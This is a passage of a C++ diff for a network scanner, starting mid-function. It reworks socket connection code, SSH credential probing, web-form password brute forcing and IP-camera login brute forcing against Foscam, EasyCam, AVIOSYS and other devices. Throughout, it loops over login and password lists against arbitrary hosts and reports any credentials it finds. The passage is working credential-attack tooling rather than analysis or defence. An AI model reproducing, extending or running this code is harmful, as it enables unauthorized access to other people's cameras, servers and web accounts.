-
-		};
 		return -1;
-
 	};
 #else
 	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
 	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
 	else 
 	{
-		if(mode != 1) 
-		{
-			++offlines;
-			char temp[256] = {0};
-			strcpy(temp, "[Bad address (");
-
-			strcat(temp, ip);
-			strcat(temp, ":");
-			strcat(temp, std::to_string((long double)port).c_str());
-			strcat(temp, "):");
-			strcat(temp, std::to_string((long double)WSAGetLastError()).c_str());
-			strcat(temp, "]");
-
-#pragma region QTGUI_Area
-			stt->doEmitionRedFoundData(QString(temp));
-#pragma endregion
-
-			return -1;
-		}
-		else
-		{
-			++offlines;
-			return -1;
-		};
+		++offlines;
+		return -1;
 	};
 #endif
 
@@ -1590,7 +1527,6 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 	u_long FAR cmd = 1;
 	if( ioctlsocket( sock , FIONBIO, &cmd ) != 0 )
 #else
-	u_long cmd = 1;
 	if( fcntl( sock , F_SETFL, O_NDELAY ) == -1 )
 #endif
 	{
@@ -1610,16 +1546,13 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 		closesocket(sock);
 	}
 
-
 	int on = 1;
-	int status = setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (const char *) &on, sizeof(on));
-
 	linger.l_onoff = 1;
 	linger.l_linger = 30;
-	status = setsockopt(sock, SOL_SOCKET, SO_LINGER, (const char *) &linger, sizeof(linger));
+	setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (const char *) &on, sizeof(on));
+	setsockopt(sock, SOL_SOCKET, SO_LINGER, (const char *) &linger, sizeof(linger));
 
 	int iError, iResult = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
-
 	if(iResult == SOCKET_ERROR)
 	{
 		iError = WSAGetLastError();
@@ -1640,10 +1573,8 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 			FD_SET(sock, &read_fs);
 			timeval tv = { gTimeOut, 0 };
 
-			int res2 = select(sock + 1, NULL, &read_fs, 0, &tv);
-
+			iResult = select(sock + 1, NULL, &read_fs, 0, &tv);
 			int cErrCode = WSAGetLastError();
-
 			while(cErrCode == 10038)
 			{
 				if(gDebugMode) stt->doEmitionDebugFoundData("[ConnectTo] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");
@@ -1653,14 +1584,14 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 				FD_CLR(sock, &read_fs); 
 				sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
 				connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
-				res2 = WSAGetLastError();
-				if(res2 == 10038) continue;
+				iResult = WSAGetLastError();
+				if(iResult == 10038) continue;
 				FD_SET(sock, &read_fs);
-				res2 = select(sock + 1, NULL, &read_fs, 0, &tv);
+				iResult = select(sock + 1, NULL, &read_fs, 0, &tv);
 				cErrCode = WSAGetLastError();
 			};
 
-			if (res2 == SOCKET_ERROR) 
+			if (iResult == SOCKET_ERROR) 
 			{
 				++offlines;
 				char temp[128] = {0};
@@ -1674,86 +1605,46 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 #pragma region QTGUI_Area
 				stt->doEmitionRedFoundData(QString(temp));
 #pragma endregion
-				ZeroMemory(temp, strlen(temp));
+				ZeroMemory(temp, sizeof(temp));
 			}
 			else
 			{
-				if (!res2) 
-				{
-					++offlines;
-				}
+				if (!iResult) ++offlines;
 				else
 				{
 					if(send(sock, request, strlen(request), 0) != SOCKET_ERROR) 
 					{
 						if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
 						Activity += strlen(request);
-						cmd = 0;
-						Lexems fd;
 						int x = 256;
 						char recvBuff[4096] = {0};
-						recvBuff2 = new char[RECV_MAX_LENGTH];
-						ZeroMemory(recvBuff2, RECV_MAX_LENGTH);
+						recvBuff2 = new char[RECV_MAX_SIZE];
+						ZeroMemory(recvBuff2, RECV_MAX_SIZE);
 
 						int bTO;
 						while (x > 0)				
 						{
-							ZeroMemory(recvBuff, 4096);
-							x = recvWT(sock, recvBuff, 4096, gTimeOut, &bTO);
+							ZeroMemory(recvBuff, sizeof(recvBuff));
+							x = recvWT(sock, recvBuff, sizeof(recvBuff), gTimeOut, &bTO);
 							if(x <= 0) break;
-
 							Activity += x;
 							recvBuffSize += x;
-
-							if( recvBuffSize > RECV_MAX_LENGTH ) 
+							if( recvBuffSize > RECV_MAX_SIZE ) 
 							{ 
-								//if(strstri(recvBuff2, "http/1.") == NULL)
-								//{
-									delete[] recvBuff2;
-									recvBuff2 = NULL;
+								delete[] recvBuff2;
+								recvBuff2 = NULL;
 
-									FD_CLR(sock, &read_fs);
-									shutdown(sock, SD_BOTH);
-									closesocket(sock);
-									++Overl;
+								FD_CLR(sock, &read_fs);
+								shutdown(sock, SD_BOTH);
+								closesocket(sock);
+								++Overl;
 
-									CSTR->lowerBuff = new char[11];
-									strcpy(CSTR->lowerBuff, "[OVERFLOW]");
-									CSTR->size = 10;
-									return 0;
-								//} 
-								//else break;
+								CSTR->lowerBuff = new char[11];
+								strcpy(CSTR->lowerBuff, "[OVERFLOW]");
+								CSTR->size = 10;
+								return 0;
 							};
-							if(globalScanFlag == true || force)
-							{
-								if(x > 0)
-								{
-									memset((void*)(recvBuff + x), '\0', 1);
-
-									strncat(recvBuff2, recvBuff, x);
-									if((strstr(recvBuff, "220") || strstr(recvBuff, "500 'GET':")) && port == 21) 
-									{							
-										break;
-									};
-
-									if(strstri(recvBuff, "220 FTP server ready") != NULL
-										|| strstri(recvBuff, "220 DiskStation FTP server ready") != NULL
-										|| strstri(recvBuff, "500 'GET': command not understood") != NULL
-										)
-									{
-										delete[] recvBuff2;
-										recvBuff2 = NULL;
-										FD_CLR(sock, &read_fs);
-										shutdown(sock, SD_BOTH);
-										closesocket(sock);
-
-										CSTR->lowerBuff = new char[recvBuffSize + 1];
-										strcpy(CSTR->lowerBuff, recvBuff);
-										CSTR->size = recvBuffSize;
-										return 0;
-									};							
-								};
-							};
+							strncat(recvBuff2, recvBuff, x);
 						};
 					}
 					else
@@ -1770,7 +1661,7 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 #pragma region QTGUI_Area
 						stt->doEmitionRedFoundData(QString(temp));
 #pragma endregion
-						ZeroMemory(temp, strlen(temp));
+						ZeroMemory(temp, sizeof(temp));
 					};
 				};
 			};
@@ -1787,12 +1678,9 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 			if(err == 10055) 
 			{
 				strcpy(temp, "-Connection pool depleted- ");
-
 #pragma region QTGUI_Area
 				stt->doEmitionRedFoundData("[SOCKERR 10055] " + QString(temp) + QString(ip) + ":" + QString::number(port));
 #pragma endregion
-				ZeroMemory(temp, strlen(temp));
-
 				shutdown(sock, SD_BOTH);
 				closesocket(sock);
 				Sleep(60000);
@@ -1806,13 +1694,9 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 				strcat(temp, " - ");
 				strcat(temp, std::to_string((long double)err).c_str());
 				strcat(temp, "]");
-
 #pragma region QTGUI_Area
 				stt->doEmitionRedFoundData(QString(temp));
 #pragma endregion
-
-				ZeroMemory(temp, strlen(temp));
-
 				shutdown(sock, SD_BOTH);
 				closesocket(sock);
 			}
@@ -1830,9 +1714,6 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 #pragma region QTGUI_Area
 				stt->doEmitionRedFoundData(QString(temp));
 #pragma endregion
-
-				ZeroMemory(temp, strlen(temp));
-
 				shutdown(sock, SD_BOTH);
 				closesocket(sock);
 			};
@@ -1852,27 +1733,23 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 #pragma region QTGUI_Area
 		stt->doEmitionRedFoundData(QString(temp));
 #pragma endregion
-		ZeroMemory(temp, strlen(temp));
 	};
 
 	if( globalScanFlag == false && force == 0) 
 	{
 		if(recvBuff2 != NULL) delete []recvBuff2;
 		recvBuff2 = NULL;
-
 		return -1;
 	};
 
 	if(recvBuff2 != NULL && recvBuffSize > 0)
 	{
 		if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff2));
-		std::string res2 = "";
-		if(strlen(recvBuff2) > recvBuffSize) recvBuffSize = strlen(recvBuff2);
 		CSTR->lowerBuff = new char[recvBuffSize + 1];
-		ZeroMemory(CSTR->lowerBuff, sizeof(CSTR->lowerBuff));
+		ZeroMemory(CSTR->lowerBuff, recvBuffSize + 1);
 		CSTR->size = recvBuffSize;
 		strncpy(CSTR->lowerBuff, recvBuff2, recvBuffSize);
-		memset(CSTR->lowerBuff + (recvBuffSize), '\0', 1);
+		memset(CSTR->lowerBuff + recvBuffSize, '\0', 1);
 
 		delete []recvBuff2;
 		recvBuff2 = NULL;
@@ -1911,8 +1788,10 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 		int passCounter = 1;
 		for(int i = 0; i < MaxWFLogin; ++i)
 		{
+			if(globalScanFlag == false) break;
 			for(int j = firstCycle; j < MaxWFPass; ++j)
 			{
+				if(globalScanFlag == false) break;
 				CSTR.lowerBuff = NULL;
 				CSTR.size = 0;
 				cRes = 0;
@@ -1985,7 +1864,7 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 					{
 						if(i == 0) 
 						{
-							ZeroMemory(request, 2048);
+							ZeroMemory(request, sizeof(request));
 
 							OnLiner = 0;
 
@@ -1994,7 +1873,7 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 						};
 						char pass[256] = {0};
 
-						ZeroMemory(pass, 256);
+						ZeroMemory(pass, sizeof(pass));
 						strcpy(pass, ip);
 						strcat(pass, " - Web Form password found: ");
 						strcat(pass, wfLoginLst[i]);
@@ -2011,7 +1890,7 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 				}
 				else
 				{
-					ZeroMemory(request, 2048);
+					ZeroMemory(request, sizeof(request));
 
 					OnLiner = 0;
 
@@ -2020,7 +1899,7 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 				};
 
 				if(i == 0) ++i;
-				ZeroMemory(request, 2048);
+				ZeroMemory(request, sizeof(request));
 			};
 			firstCycle = 1;
 		};
@@ -2031,8 +1910,10 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 		int firstCycle = 0;
 		for(int i = 0; i < MaxWFLogin; ++i)
 		{
+			if(globalScanFlag == false) break;
 			for(int j = firstCycle; j < MaxWFPass; ++j)
 			{
+				if(globalScanFlag == false) break;
 				CSTR.lowerBuff = NULL;
 				CSTR.size = 0;
 				cRes = 0;
@@ -2066,7 +1947,6 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 
 				if(port == 443) cRes = con._EstablishSSLConnection(ip, port, request, &CSTR);
 				else cRes = con._EstablishConnection(ip, port, request, &CSTR);
-
 
 				if(CSTR.lowerBuff != NULL)
 				{
@@ -2108,8 +1988,8 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 					{
 						if(i == 0) 
 						{
-							ZeroMemory(request, 2048);
-							ZeroMemory(argData, 256);
+							ZeroMemory(request, sizeof(request));
+							ZeroMemory(argData, sizeof(argData));
 
 							OnLiner = 0;
 
@@ -2118,7 +1998,7 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 						};
 						char pass[256] = {0};
 
-						ZeroMemory(pass, 256);
+						ZeroMemory(pass, sizeof(pass));
 						strcpy(pass, ip);
 						strcat(pass, " - Web Form password found: ");
 						strcat(pass, wfLoginLst[i]);
@@ -2135,8 +2015,8 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 				}
 				else
 				{
-					ZeroMemory(request, 2048);
-					ZeroMemory(argData, 256);
+					ZeroMemory(request, sizeof(request));
+					ZeroMemory(argData, sizeof(argData));
 
 					OnLiner = 0;
 
@@ -2144,8 +2024,8 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 					return lps;
 				};
 				if(i == 0) ++i;
-				ZeroMemory(request, 2048);
-				ZeroMemory(argData, 256);
+				ZeroMemory(request, sizeof(request));
+				ZeroMemory(argData, sizeof(argData));
 			};
 			firstCycle = 1;
 		};
@@ -2155,8 +2035,8 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 		stt->doEmitionFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: Unknown method.");
 	};
 
-	ZeroMemory(request, 2048);
-	ZeroMemory(argData, 256);
+	ZeroMemory(request, sizeof(request));
+	ZeroMemory(argData, sizeof(argData));
 
 	OnLiner = 0;
 
@@ -2176,13 +2056,11 @@ lopaStr Connector::_WFLobby(char *cookie, char *ip, int port, char *methodVal, c
 	return res;
 };
 #pragma endregion
-
 #pragma region SSH
-
-int _sshConnect(char *user, char *pass, char *host)
+int _sshConnect(char *user, char *pass, char *host, int port)
 {
 	char hostStr[128] = {0};
-	ZeroMemory(hostStr, 128);
+	ZeroMemory(hostStr, sizeof(hostStr));
 	strcpy(hostStr, user);
 	strcat(hostStr, "@");
 	strcat(hostStr, host);
@@ -2195,6 +2073,7 @@ int _sshConnect(char *user, char *pass, char *host)
 	};
 
 	ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, hostStr);
+	ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
 	//ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
 	//ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY_STR, &verbosity);
 	//ssh_options_set(my_ssh_session, SSH_OPTIONS_STRICTHOSTKEYCHECK, 0);
@@ -2225,12 +2104,12 @@ int _sshConnect(char *user, char *pass, char *host)
 	++ssh;
 	return 0;
 };
-char *_get_ssh_banner(char *ip)
+char *_get_ssh_banner(char *ip, int port)
 {
 	Connector con;
 	conSTR CSTR;
 	char recvBuff[256] = {0};
-	con._EstablishConnection(ip, 22, "", &CSTR);
+	con._EstablishConnection(ip, port, "", &CSTR);
 	if(CSTR.lowerBuff != NULL && CSTR.size != 0)
 	{
 		strncpy(recvBuff, CSTR.lowerBuff, CSTR.size < 256 ? CSTR.size : 256);
@@ -2242,11 +2121,11 @@ char *_get_ssh_banner(char *ip)
 	};
 	return recvBuff;
 };
-int check_ssh_pass(char *user, char *pass, char *userPass, char *host, conSTR *CSTR, char *banner)
+int check_ssh_pass(char *user, char *pass, char *userPass, char *host, int port, conSTR *CSTR, char *banner)
 {
 	int res = -1;
-	if(BALogSwitched) stt->doEmitionBAData("Probing SSH: " + QString(user) + ":" + QString(pass) + "@" + QString(host));
-	res = _sshConnect(user, pass, host);
+	if(BALogSwitched) stt->doEmitionBAData("Probing SSH: " + QString(user) + ":" + QString(pass) + "@" + QString(host) + ":" + QString::number(port));
+	res = _sshConnect(user, pass, host, port);
 	if(res == 0)
 	{
 		stt->doEmition_BAGreenData("[+] SSH: " + QString(user) + ":" + QString(pass) + "@" + QString(host));
@@ -2266,7 +2145,7 @@ int check_ssh_pass(char *user, char *pass, char *userPass, char *host, conSTR *C
 	};
 	return res;
 };
-int _EstablishSSHConnection(char *host, conSTR *CSTR, char *banner)
+int _EstablishSSHConnection(char *host, int port, conSTR *CSTR, char *banner)
 {
 	CSTR->lowerBuff = NULL;
 	CSTR->size = 0;
@@ -2286,28 +2165,22 @@ int _EstablishSSHConnection(char *host, conSTR *CSTR, char *banner)
 		sz = ptr1 - temp;
 		strncpy(login, temp, sz);
 		strcpy(pass, ptr1 + 1);
-		res = check_ssh_pass(login, pass, temp, host, CSTR, banner);
+		res = check_ssh_pass(login, pass, temp, host, port, CSTR, banner);
+		ZeroMemory(login, sizeof(login));
+		ZeroMemory(pass, sizeof(pass));
+		ZeroMemory(temp, sizeof(temp));
 		if(res == 0) 
 		{
-			ZeroMemory(login, 32);
-			ZeroMemory(pass, 32);
-			ZeroMemory(temp, 64);
 			SSHConDec();
 			OnLiner = 0;
 			return 0;
 		}
 		else if(res == -2)
 		{
-			ZeroMemory(login, 32);
-			ZeroMemory(pass, 32);
-			ZeroMemory(temp, 64);
 			SSHConDec();
 			OnLiner = 0;
 			return -2;
 		};
-		ZeroMemory(login, 32);
-		ZeroMemory(pass, 32);
-		ZeroMemory(temp, 64);
 		Sleep(500);
 	};
 	SSHConDec();
@@ -2315,7 +2188,6 @@ int _EstablishSSHConnection(char *host, conSTR *CSTR, char *banner)
 	return -1;
 };
 #pragma endregion
-
 #pragma region IPCAMWeb
 int _webLoginSeq(char *request, char *login, char *pass, char *ip, int port, int passCounter, char *type, std::vector<char*> negVector)
 {
@@ -2333,18 +2205,14 @@ int _webLoginSeq(char *request, char *login, char *pass, char *ip, int port, int
 	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
 	else 
 	{
-#pragma region QTGUI_Area
-		stt->doEmitionRedFoundData("[" + QString(type) + "] Bad address! [" + QString(ip) + "]");
-#pragma endregion
+		return -1;
 	};
 #else
 	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
 	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
 	else 
 	{
-#pragma region QTGUI_Area
-		stt->doEmitionRedFoundData("[" + QString(type) + "] Bad address! [" + QString(ip) + "]");
-#pragma endregion
+		return -1;
 	};
 #endif
 	sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
@@ -2470,17 +2338,17 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 	{
 		if(globalScanFlag == false) break;
 		if(strcmp(loginLst[i], " ") == 0) continue;
-		ZeroMemory(login, 128);
+		ZeroMemory(login, sizeof(login));
 		strcpy(login, loginLst[i]);
 		for(int j = 0; j < MaxPass; j++)
 		{
 			if(globalScanFlag == false) break;
 			if(strcmp(passLst[j], " ") == 0) continue;
 			
-			ZeroMemory(pass, 128);
+			ZeroMemory(pass, sizeof(pass));
 			strcpy(pass, passLst[j]);
 
-			ZeroMemory(request, 1024);
+			ZeroMemory(request, sizeof(request));
 			if(strcmp(SPEC, "IPC") == 0)
 			{
 				strcpy(request, "GET /login.xml?user=");
@@ -2494,14 +2362,6 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 				strcat(request, " HTTP/1.1\r\nHost: ");
 				strcat(request, ip);
 				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
-
-				if(_webLoginSeq(request, login, pass, ip, port, passCounter, SPEC, negVector) == 1)
-				{
-					OnLiner = 0;
-					strcpy(lps.login, loginLst[i]);
-					strcpy(lps.pass, passLst[j]);
-					return lps;
-				};
 			}
 			else if(strcmp(SPEC, "GEO") == 0)
 			{
@@ -2512,14 +2372,6 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 				strcat(request, " HTTP/1.1\r\nHost: ");
 				strcat(request, ip);
 				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
-
-				if(_webLoginSeq(request, login, pass, ip, port, passCounter, SPEC, negVector) == 1)
-				{
-					OnLiner = 0;
-					strcpy(lps.login, loginLst[i]);
-					strcpy(lps.pass, passLst[j]);
-					return lps;
-				};
 			}
 			else if(strcmp(SPEC, "EasyCam") == 0)
 			{
@@ -2534,14 +2386,6 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 				strcat(request, " HTTP/1.1\r\nHost: ");
 				strcat(request, ip);
 				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
-
-				if(_webLoginSeq(request, login, pass, ip, port, passCounter, SPEC, negVector) == 1)
-				{
-					OnLiner = 0;
-					strcpy(lps.login, login);
-					strcpy(lps.pass, pass);
-					return lps;
-				};
 			}
 			else if(strcmp(SPEC, "Foscam") == 0)
 			{
@@ -2556,14 +2400,6 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 				strcat(request, " HTTP/1.1\r\nHost: ");
 				strcat(request, ip);
 				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
-
-				if(_webLoginSeq(request, login, pass, ip, port, passCounter, SPEC, negVector) == 1)
-				{
-					OnLiner = 0;
-					strcpy(lps.login, login);
-					strcpy(lps.pass, pass);
-					return lps;
-				};
 			}
 			else if(strcmp(SPEC, "AVIOSYS") == 0)
 			{
@@ -2574,14 +2410,22 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 				strcat(request, " HTTP/1.1\r\nHost: ");
 				strcat(request, ip);
 				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
+			};
 
-				if(_webLoginSeq(request, login, pass, ip, port, passCounter, SPEC, negVector) == 1)
-				{
-					OnLiner = 0;
-					strcpy(lps.login, loginLst[i]);
-					strcpy(lps.pass, passLst[j]);
-					return lps;
-				};
+			int res = _webLoginSeq(request, login, pass, ip, port, passCounter, SPEC, negVector);
+
+			if(res == 1)
+			{
+				OnLiner = 0;
+				strcpy(lps.login, loginLst[i]);
+				strcpy(lps.pass, passLst[j]);
+				return lps;
+			}
+			else if(res == -1)
+			{
+				OnLiner = 0;
+				strcpy(lps.login, "UNKNOWN");
+				return lps;
 			};
 			++passCounter;
 		};
@@ -2592,7 +2436,7 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 };
 lopaStr Connector::_IPCameraBLobby(char *ip, int port, char *SPEC)
 {
-	while(BrutingThrds >= gMaxBrutingThreads) Sleep(700);
+	while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);
 
 	BConInc();
 	lopaStr res = _IPCameraBrute(ip, port, SPEC);
@@ -2601,7 +2445,6 @@ lopaStr Connector::_IPCameraBLobby(char *ip, int port, char *SPEC)
 	return res;
 };
 #pragma endregion
-
 int _pingMyTarget(char *ip)
 {
 	HANDLE hIcmpFile;
@@ -2662,12 +2505,20 @@ int _pingMyTarget(char *ip)
 		return 0;
     };
 };
-
 QString strIP;
 QString strPort;
 const char *buff1 = "GET / HTTP/1.1\r\nHost: ";
 const char *buff2 = "\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: us-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nConnection: close\r\n\r\n";
-void Connector::_ConnectToPort(char *ip, const char *portC, char *hl)											
+int _SSHLobby(char *ip, int port, conSTR *CSTR)
+{
+	char banner[256] = {0};
+	strncpy(banner, _get_ssh_banner(ip, port), 256);
+	if(strlen(banner) > 0)
+	{
+		return _EstablishSSHConnection(ip, port, CSTR, banner);
+	};
+};
+void Connector::_ConnectToPort(char *ip, const char *portC, char *hl)
 {	
 	if(gPingNScan)
 	{
@@ -2676,48 +2527,40 @@ void Connector::_ConnectToPort(char *ip, const char *portC, char *hl)
 			return;
 		};
 	};
-	
-		char mes[512] = {0};
-		conSTR CSTR;
+
+	char mes[512] = {0};
+	conSTR CSTR;
+	CSTR.lowerBuff = NULL;
+	CSTR.size = 0;
+
+	int strFlag = 0;
+	strcpy(mes, buff1);
+	strcat(mes, ip);
+	strcat(mes, buff2);
+	int port = atoi(portC);
+	int cRes;
+
+	if(port == 443) cRes = _EstablishSSLConnection(ip, port, mes, &CSTR);
+	else if(port == 22) cRes = _SSHLobby(ip, port, &CSTR);
+	else cRes = _EstablishConnection(ip, port, mes, &CSTR);
+	int size = CSTR.size;
+
+	if(size > 0 && cRes != -1)
+	{
+		++Alive;
+		++found;
+		stt->doEmitionChangeParsed(QString::number(saved) + "/" + QString::number(found));
+
+		Lexems lx;
+		lx._filler(port, CSTR.lowerBuff, ip, size, &lx, hl);
+		delete []CSTR.lowerBuff;
 		CSTR.lowerBuff = NULL;
-		CSTR.size = 0;
+	};
 
-		int strFlag = 0;
-		strcpy(mes, buff1);
-		strcat(mes, ip);
-		strcat(mes, buff2);
-		int port = atoi(portC);
-		int cRes;
-	
-		if(port == 443) cRes = _EstablishSSLConnection(ip, port, mes, &CSTR);
-		else if(port == 22) 
-		{
-			char banner[256] = {0};
-			strncpy(banner, _get_ssh_banner(ip), 256);
-			if(strlen(banner) > 0)
-			{
-				cRes = _EstablishSSHConnection(ip, &CSTR, banner);
-			};
-		}
-		else cRes = _EstablishConnection(ip, port, mes, &CSTR);
-		int size = CSTR.size;
-
-		if(size > 0 && cRes != -1)
-		{
-			++Alive;
-			++found;
-			stt->doEmitionChangeParsed(QString::number(saved) + "/" + QString::number(found));
-
-			Lexems lx;
-			lx._filler(port, CSTR.lowerBuff, ip, size, &lx, hl);
-			delete []CSTR.lowerBuff;
-			CSTR.lowerBuff = NULL;
-		};
-
-		if(CSTR.lowerBuff != NULL) 
-		{
-			delete []CSTR.lowerBuff;
-			CSTR.lowerBuff = NULL;
-		};
-		strFlag = 1;
+	if(CSTR.lowerBuff != NULL) 
+	{
+		delete []CSTR.lowerBuff;
+		CSTR.lowerBuff = NULL;
+	};
+	strFlag = 1;
 };
